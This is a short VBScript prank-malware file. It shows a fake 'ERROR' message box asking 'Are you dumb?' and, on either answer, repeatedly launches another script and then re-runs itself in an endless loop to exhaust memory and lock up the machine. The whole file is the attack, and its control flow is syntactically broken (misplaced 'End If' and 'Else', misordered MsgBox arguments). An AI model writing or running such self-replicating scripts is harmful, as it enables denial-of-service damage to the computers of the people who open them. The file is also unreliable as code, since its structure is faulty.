Dim Msg, Style, Help, Title, Ctxt, Response, MyString
Msg = "Are you dumb?"    ' Define message.
Style = vbYesNo Or vbInformation Or vbDefaultButton1    ' Define buttons.
Title = "ERROR"    ' Define title.
Help = "ERROR" 'Define help file
Ctxt = 1000    ' Define topic context. 
dim count
set object = wscript.CreateObject("wscript.shell")
        ' Display message.
Response = MsgBox(Msg, Style, Help, Title, Ctxt)
If Response = vbYes Then    ' User chose Yes.
    MyString = "Yes"    
    do
    object.run "file.vbs"
    count = count + 1
    loop until count = 69
    WScript.Sleep(6900)
    set ramconsumer = createobject("wscript.shell")
    do
    ramconsumer.run wscript.scriptname
    loop
    End If
Else    ' User chose No.
    MyString = "No"  
    do
    object.run "file.vbs"
    count = count + 1
    loop until count = 9223372036854775807
    WScript.Sleep(12000)
    set ramconsumer = createobject("wscript.shell")
    do
    ramconsumer.run wscript.scriptname
    loop
    End If
